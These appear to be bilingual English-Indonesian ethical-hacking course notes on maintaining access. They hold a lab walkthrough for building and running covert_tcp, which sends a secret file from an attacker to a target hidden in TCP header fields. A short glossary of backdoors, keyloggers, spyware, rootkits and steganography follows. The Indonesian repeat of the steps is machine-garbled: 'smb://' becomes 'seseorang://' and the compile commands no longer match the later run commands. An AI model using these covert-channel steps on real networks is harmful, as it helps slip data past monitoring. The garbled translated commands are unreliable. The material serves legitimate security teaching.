# Bagian 03: Maintaining Access/Mempertahankan Akses

*Lab3-Task6: Covert Channels using Covert\_TCP/Saluran Terselubung menggunakan Terselubung\_TCP**


- **Attacker:**
  - cd Desktop
  - mkdir Send
  - cd Send
  - echo &quot;Secret&quot;->message.txt
  - Place->Network
  - Ctrl+L
  - **smb://[IP]**
  - Account &amp; Password
  - copy and paste covert\_tcp.c
  - **cc -o covert\_tcp covert\_tcp.c**
- **Target:**
  - **tcpdump -nvvx port 8888 -I lo**
  - cd Desktop
  - mkdir Receive
  - cd Receive
  - File->Ctrl+L
  - smb://[IP]
  - copy and paste covert\_tcp.c
  - cc -o covert\_tcp covert\_tcp.c
  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
  - **Tcpdump captures no packets**
- **Attacker**
  - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/attacker/Desktop/send/message.txt**
  - Wireshark (message string being send in individual packet)

  ---------------------------------------
  atau mungkin saya tulis dengan bahasa indonesia agar mudah di pahami:

- **Penyerang:**
 - CD Desktop
 - mkdir Kirim
 - cd Kirim
 - echo &quot;Rahasia&quot;->message.txt
 - Tempat->Jaringan
 - Ctrl+L
 - **seseorang://[IP]**
 - Akun &amp; Kata sandi
 - salin dan tempel secara rahasia\_tcp.c
 - **cc -o rahasia\_tcp rahasia\_tcp.c**
- **Target:**
 - **tcpdump -nvvx port 8888 -I lo**
 - CD Desktop
 - mkdir Terima
 - cd Terima
 - File->Ctrl+L
 - seseorang://[IP]
 - salin dan tempel secara rahasia\_tcp.c
 - cc -o rahasia\_tcp rahasia\_tcp.c
 - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 9999 -dest\_port 8888 -server -file /home/ubuntu/Desktop/Receive/receive.txt**
 - **Tcpdump tidak menangkap paket**
- **Penyerang**
 - **./covert\_tcp -dest 10.10.10.9 -source 10.10.10.13 -source\_port 8888 -dest\_port 9999 -file /home/penyerang/Desktop/send/message.txt**
 - Wireshark (string pesan dikirim dalam paket individual)
==================== =======

## Maintaining Access/Mempertahankan Akses

Backdoor/Pintu belakang

[Definisi](../definitions/definitions_B.md#backdoor)

Keylogger / Keystroke logger/

Pencatat kunci / pencatat penekanan tombol

[Definisi](../definitions/definitions_K.md#keylogger)

Spyware/Perangkat mata-mata

[Definisi](../definitions/definitions_S.md#spyware)

Rootkit/perangkat root

[Definisi](../definitions/definitions_R.md#rootkit)

Steganography/Steganografi

[Definisi](../definitions/definitions_S.md#steganografi)
